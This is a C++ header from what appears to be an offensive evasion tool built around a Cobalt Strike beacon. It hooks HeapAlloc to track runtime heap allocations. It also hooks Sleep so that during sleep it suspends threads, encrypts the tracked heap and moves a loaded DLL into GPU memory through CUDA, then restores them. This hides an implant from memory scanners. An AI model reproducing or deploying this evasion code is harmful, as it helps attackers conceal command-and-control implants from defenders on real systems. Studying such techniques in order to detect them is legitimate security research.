#pragma once
#include <map>
#include <windows.h>
#include <iostream>
#include <intrin.h>
#include <psapi.h>

#include "utils.h"
#include "cuda.h"
#include "SuspendThreads.h"
#include "MoveDLL.h"

BOOL intercept = FALSE;

LPVOID HookedHeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes) {
	LPVOID pointerToEncrypt = OldHeapAlloc(hHeap, dwFlags, dwBytes);

	if (intercept)
		return pointerToEncrypt;

	intercept = TRUE;
	if (GlobalThreadId == GetCurrentThreadId()) { // If the calling ThreadId matches our initial thread id then continue

		HMODULE hModule;
		char lpBaseName[256];

		if (GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR)_ReturnAddress(), &hModule) != 0) {
			if (GetModuleBaseNameA(GetCurrentProcess(), hModule, lpBaseName, sizeof(lpBaseName)) != 0) {
				printf("Reserved %d at %08x from %s\n", dwBytes, pointerToEncrypt, lpBaseName);
				if (!strcmp(lpBaseName, "msvcrt.dll") || !strcmp(lpBaseName, "ucrtbase.dll")) {
				//if (!strcmp(lpBaseName, "BasicDLL.dll")) {
					printf("Reserved %d at %08x\n", dwBytes, pointerToEncrypt);
					heapMap[pointerToEncrypt] = dwBytes;
				}
			}
		}
	}
	intercept = FALSE;

	return pointerToEncrypt;
}

void HookedSleep(DWORD dwMilliseconds) {

	std::cout << "Hooked Sleep!\n";
	// so Context cannot be init before CS beacon is fired up, I dunno why... If init before, cuda returns error 201
	Context = initCuda(&Api, &Context);

	ULONG_PTR storageGPU;

	DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());
	std::cout << "Heap encrypt starts\n";
	HeapEncryptMap(heapMap);

	DWORD SizeOfHeaders;
	storageGPU = MoveDLLToGPUStrorage(dll, &SizeOfHeaders, &Api);
	std::cout << "Sleeping....\n";
	OldSleep(dwMilliseconds);
	MoveDLLFromGPUStrorage(dll, storageGPU, SizeOfHeaders, &Api);

	HeapEncryptMap(heapMap);
	std::cout << "Heap decrypt done\n";
	DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());
}

// ####### TESTING FUNCTION #########
void run1(std::map<LPVOID, DWORD> heapMap) {

	ULONG_PTR storageGPU;

	dll = LoadLibraryA("BasicDLL.dll");
	typeFunc funcRun = (typeFunc)GetProcAddress(dll, "Run");

	funcRun();
}